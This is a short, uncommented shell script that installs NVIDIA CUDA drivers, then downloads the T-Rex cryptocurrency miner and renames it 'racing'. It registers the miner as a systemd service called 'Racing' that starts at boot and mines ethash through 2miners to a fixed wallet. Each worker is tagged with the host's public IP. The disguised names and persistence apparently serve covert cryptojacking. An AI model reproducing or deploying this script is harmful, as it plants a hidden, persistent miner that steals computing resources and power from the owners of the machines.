cd /home
myworker=$(date +'%d%m_%H%M%S_')
myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
myworker+=$myip
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
sudo apt-get install libcurl3 -y
wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_re\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
./racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $myworker &
